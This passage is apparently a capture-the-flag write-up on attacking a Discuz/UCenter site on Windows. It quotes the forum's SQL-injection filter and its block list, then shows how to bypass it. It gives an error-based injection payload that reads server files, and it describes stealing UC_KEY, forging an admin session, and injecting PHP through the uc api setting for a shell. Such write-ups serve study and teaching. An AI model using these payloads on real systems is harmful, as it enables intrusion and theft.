                            if(!$mark) {
                                $mark = '`';
                                $clean .= $str;
                            } elseif ($mark == '`') {
                                $mark = '';
                            }
                            break;
                        case '\'':
                            if (!$mark) {
                                $mark = '\'';
                                $clean .= $str;
                            } elseif ($mark == '\'') {
                                $mark = '';
                            }
                            break;
                        case '/':
                            if (empty($mark) && $sql[$i + 1] == '*') {
                                $mark = '/*';
                                $clean .= $mark;
                                $i++;
                            } elseif ($mark == '/*' && $sql[$i - 1] == '*') {
                                $mark = '';
                                $clean .= '*';
                            }
                            break;
                        case '#':
                            if (empty($mark)) {
                                $mark = $str;
                                $clean .= $str;
                            }
                            break;
                        case "\n":
                            if ($mark == '#' || $mark == '--') {
                                $mark = '';
                            }
                            break;
                        case '-':
                            if (empty($mark) && substr($sql, $i, 3) == '-- ') {
                                $mark = '-- ';
                                $clean .= $mark;
                            }
                            break;
                        default:
                            break;
                    }
                    $clean .= $mark ? '' : $str;
                }
            }
            if(strpos($clean, '@') !== false) {
                return '-3';
            }
            $clean = preg_replace("/[^a-z0-9_\-\(\)#\*\/\"]+/is", "", strtolower($clean));
            if (self::$config['afullnote']) {
                $clean = str_replace('/**/', '', $clean);
            }
            if (is_array(self::$config['dfunction'])) {
                foreach (self::$config['dfunction'] as $fun) {
                    if (strpos($clean, $fun . '(') !== false)
                        return '-1';
                }
            }
            if (is_array(self::$config['daction'])) {
                foreach (self::$config['daction'] as $action) {
                    if (strpos($clean, $action) !== false)
                        return '-3';
                }
            }       
            if (self::$config['dlikehex'] && strpos($clean, 'like0x')) {
                return '-2';
            }
            if (is_array(self::$config['dnote'])) {
                foreach (self::$config['dnote'] as $note) {
                    if (strpos($clean, $note) !== false)
                        return '-4';
                }
            }
and the configure in:
    $_config['security']['querysafe']['dfunction']['0'] = 'load_file';
    $_config['security']['querysafe']['dfunction']['1'] = 'hex';
    $_config['security']['querysafe']['dfunction']['2'] = 'substring';
    $_config['security']['querysafe']['dfunction']['3'] = 'if';
    $_config['security']['querysafe']['dfunction']['4'] = 'ord';
    $_config['security']['querysafe']['dfunction']['5'] = 'char';
    $_config['security']['querysafe']['daction']['0'] = '@';
    $_config['security']['querysafe']['daction']['1'] = 'intooutfile';
    $_config['security']['querysafe']['daction']['2'] = 'intodumpfile';
    $_config['security']['querysafe']['daction']['3'] = 'unionselect';
    $_config['security']['querysafe']['daction']['4'] = '(select';
    $_config['security']['querysafe']['daction']['5'] = 'unionall';
    $_config['security']['querysafe']['daction']['6'] = 'uniondistinct';
    $_config['security']['querysafe']['dnote']['0'] = '/*';
    $_config['security']['querysafe']['dnote']['1'] = '*/';
    $_config['security']['querysafe']['dnote']['2'] = '#';
    $_config['security']['querysafe']['dnote']['3'] = '--';
    $_config['security']['querysafe']['dnote']['4'] = '"';
It open the `afullnote` in this challenge.
        if (self::$config['afullnote']) {
            $clean = str_replace('/**/', '', $clean);
        }
Since `/**/` is replaced with empty, we can directly add select to the middle,
and then replaced with empty, we can bypass the waf here.
When we got an error injection, we tried to read the file content and found
that because mysql is `5.5.29`, we can directly read any file on the server.
    $code = 'time='.time().'&action=renameuser&uid=1&newusername=ddog\',name=(\'a\' or updatexml(1,concat(0x7e,(/*!00000select*/ /*!00000load_file*/(\'c:/windows/win.ini\') limit 1)),0)),title=\'a';
When the idea came here, there was a fault, because we couldn't know where the
web path was, so we couldn't read the web file directly. Here I was deadlocked
for a long time, and finally the password was weak after the first person made
the question. I went straight into the background.
In the process of backtracking, I found that there is still a way. Although
the path of the web is very flexible for windows, in fact, for integrated
environments, it is generally installed under the c drive, and most people
will not move. The server path. Common windows integrated environment mainly
includes phpstudy and wamp, these two paths are respectively
    - /wamp64/www/
    - /phpstudy_pro/WWW/
After finding the corresponding path, we can read
`\uc_server\data\config.inc.php` to get`UC_KEY` of uc server.
After that we can directly call the one defined in `/uc_server/api/dpbak.php`
        function sid_encode($username) {
            $ip = $this->onlineip;
            $agent = $_SERVER['HTTP_USER_AGENT'];
            $authkey = md5($ip.$agent.UC_KEY);
            $check = substr(md5($ip.$agent), 0, 8);
            return rawurlencode($this->authcode("$username\t$check", 'ENCODE', $authkey, 1800));
        }
        function sid_decode($sid) {
            $ip = $this->onlineip;
            $agent = $_SERVER['HTTP_USER_AGENT'];
            $authkey = md5($ip.$agent.UC_KEY);
            $s = $this->authcode(rawurldecode($sid), 'DECODE', $authkey, 1800);
            if(empty($s)) {
                return FALSE;
            }
            @list($username, $check) = explode("\t", $s);
            if($check == substr(md5($ip.$agent), 0, 8)) {
                return $username;
            } else {
                return FALSE;
            }
        }
Construct the administrator's sid to bypass the authorization verification, in
this way we can modify the password and login to the background.
## 2\. Use the database backup to restore and change the password
In fact, when the last attack method followed the UC server's `UC_KEY`, it is
not difficult to find that there are many operations about database backup and
recovery in`/uc_server/api/dbbak.php`, which is also my previous Not found.
In fact, there is exactly the same code and function in `/api/dbbak.php`, and
that api only needs DZ â€™s`UC_KEY` to operate, we can find a place to upload at
the front desk, and then call backup to restore and overwrite the database ,
So that the administrator's password can be changed.
# Getshell in backend
After logging in, it is relatively simple, first
modify the uc api to
    http://127.0.0.1/uc_server');phpinfo();//
then, use api to update uc api
Here return 11 means success
# Finally
The whole question mainly surrounds the core key security system of DZ. In
fact, except for the Windows environment, there are almost no other special
conditions. In addition, the short file name problem is mainly on the server
side. We can easily find the backup file. After finding the backup file, we
can obtain the most important authkey and uc key directly from the database,
and the subsequent infiltration process is logical.
From this article, you can also get a glimpse of the ways in which you can use
it in different situations, and you can get more ideas with the original text.
# REF
  * 
  * 
  * 
* * *